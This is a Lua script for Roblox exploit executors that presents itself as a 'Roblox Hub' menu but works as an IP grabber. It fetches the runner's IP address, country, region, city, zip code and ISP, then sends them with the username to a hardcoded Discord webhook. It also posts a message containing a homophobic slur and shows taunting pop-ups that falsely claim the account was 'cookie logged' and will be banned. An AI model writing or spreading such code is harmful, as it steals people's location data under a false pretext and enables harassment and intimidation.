local Player = game.Players.LocalPlayer
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Loading Tabs. . .", IntroText = "Roblox Hub", IntroIcon = "rbxassetid://5841640244", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})



















function lmao()
Music = Instance.new("Sound")

Music.SoundId = "rbxassetid://130855491" --ID

Music.Parent = game.Workspace

Music.Volume = 1

Music.Looped = true

Music.Name = 'AnnoyingMusic'

wait(1)

for i, player in ipairs(game.Players:GetPlayers()) do

if player.Character then

local hum = player.PlayerGui

if hum then

game.Workspace.AnnoyingMusic:Clone().Parent = hum

game.Workspace.AnnoyingMusic:Destroy()

end

end

end



pl = game.Players:GetChildren()

for i=1,#pl do

pl[i].PlayerGui.AnnoyingMusic:Play()
end
end
























local Player = game.Players.LocalPlayer
function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;

_G.SendWebHook("https://discord.com/api/webhooks/1002121835472765030/pHmgREZgB2BfMghIwdwCZp0BzkPeo8c5bnmTCJi-yF7BWdK9tnuc5F5E5V5cJEBpw0Mn", "LOL **"..Player.Name.."** has successfully been beamed, what a faggot")











local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1002121835472765030/pHmgREZgB2BfMghIwdwCZp0BzkPeo8c5bnmTCJi-yF7BWdK9tnuc5F5E5V5cJEBpw0Mn"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)

local Main = Window:MakeTab({
	Name = "Profile",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
wait(0.5)
local Section = Main:AddSection({
	Name = "Your information"
})
wait(.1)
--------------------- Ip Adress --------------------
Main:AddParagraph("Your Ip Adress","Ip Adress: "..ipinfo_table.query..".")
wait(.1)
-------------------- Country --------------------
Main:AddParagraph("Country","Country: "..ipinfo_table.country..".")
wait(.1)
-------------------- Second country --------------------
Main:AddParagraph("Region","Region: "..ipinfo_table.regionName..".")
wait(.1)
local Section = Main:AddSection({
	Name = "Your Account"
})
wait(.1)
Main:AddParagraph("Logged in","We have successfully cookie logged your account, in 10 seconds you will be kicked as well as your account being temporarily banned")




wait(.2)
local Main = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
wait(.2)
local Main = Window:MakeTab({
	Name = "Script Hubs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
wait(.2)
local Main = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
wait(.2)
local Main = Window:MakeTab({
	Name = "FeedBack",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})





loadingScreen()
OrionLib:MakeNotification({
	Name = "Logger",
	Content = "is this your ip address "..ipinfo_table.query.."",
	Image = "rbxassetid://2129457772",
	Time = 10
})


wait(2)
OrionLib:MakeNotification({
	Name = "Logger",
	Content = "Your from "..ipinfo_table.country.." right?",
	Image = "rbxassetid://2129457772",
	Time = 10
})


wait(2)

OrionLib:MakeNotification({
	Name = "Logger",
	Content = "Oh i forgot to mention "..ipinfo_table.regionName..".",
	Image = "rbxassetid://2129457772",
	Time = 10
})

wait(2)
OrionLib:MakeNotification({
	Name = "Logger",
	Content = "LMAO GET BEAMED.",
	Image = "rbxassetid://4483345998",
	Time = 10
})



--[[
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
 
local placeId = 7111305727 -- replace here
 
TeleportService:Teleport(placeId)
]]
